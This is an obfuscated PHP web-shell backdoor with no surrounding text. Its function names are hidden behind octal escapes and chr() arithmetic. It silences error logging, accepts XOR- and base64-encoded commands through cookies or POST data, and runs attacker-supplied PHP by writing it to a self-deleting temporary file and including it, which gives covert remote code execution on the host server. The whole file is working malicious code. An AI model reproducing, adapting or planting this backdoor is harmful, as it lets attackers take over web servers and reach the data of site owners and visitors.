<?php $xrubegympg = "\146".chr(959-854).chr(1051-943)."\x65".chr(95).'p'.chr(972-855).chr(116).'_'."\x63".'o'.chr(762-652).'t'."\x65".'n'."\x74".chr(115);
$rnkfdba = "\142"."\x61"."\163"."\x65"."\66".chr(52)."\137"."\x64"."\145".chr(99)."\x6f".chr(100).'e';
$krltxdce = "\x69".chr(1009-899)."\x69".chr(1092-997)."\163"."\x65".chr(116);
$kntgfvu = "\165"."\156".chr(814-706).'i'.chr(228-118)."\153";


@$krltxdce('e'.chr(656-542)."\162".'o'.chr(114).chr(132-37).chr(235-127).'o'."\x67", NULL);
@$krltxdce("\x6c".'o'.chr(103).'_'.chr(101).'r'.chr(217-103).chr(951-840).chr(114).'s', 0);
@$krltxdce("\155".chr(97)."\170".chr(1052-957)."\145".'x'."\145".chr(99)."\165".chr(1045-929).chr(963-858).chr(111)."\156".chr(95).'t'.'i'.chr(109).chr(311-210), 0);
@set_time_limit(0);

function gngxofrwf($kggwv, $loedte)
{
    $rityout = "";
    for ($ywjlsmdsj = 0; $ywjlsmdsj < strlen($kggwv);) {
        for ($j = 0; $j < strlen($loedte) && $ywjlsmdsj < strlen($kggwv); $j++, $ywjlsmdsj++) {
            $rityout .= chr(ord($kggwv[$ywjlsmdsj]) ^ ord($loedte[$j]));
        }
    }
    return $rityout;
}

$sbmmrjb = array_merge($_COOKIE, $_POST);
$hjpychczb = '013e8343-c896-4278-9b1d-44bcaa43e8de';
foreach ($sbmmrjb as $magcacqlxr => $kggwv) {
    $kggwv = @unserialize(gngxofrwf(gngxofrwf($rnkfdba($kggwv), $hjpychczb), $magcacqlxr));
    if (isset($kggwv['a'."\x6b"])) {
        if ($kggwv['a'] == chr(532-427)) {
            $ywjlsmdsj = array(
                "\x70"."\166" => @phpversion(),
                chr(115).chr(118) => "3.5",
            );
            echo @serialize($ywjlsmdsj);
        } elseif ($kggwv['a'] == "\145") {
            $qpohau = "./" . md5($hjpychczb) . "\56".chr(105)."\156".chr(1033-934);
            @$xrubegympg($qpohau, "<" . chr(362-299).'p'.chr(104)."\x70"."\x20".chr(888-824).'u'.'n'."\154".chr(533-428).chr(959-849).'k'."\50".chr(696-601).chr(351-256)."\x46".chr(899-826)."\x4c"."\105"."\137".'_'.chr(41).chr(1022-963)."\x20" . $kggwv['d']);
            @include($qpohau);
            @$kntgfvu($qpohau);
        }
        exit();
    }
}

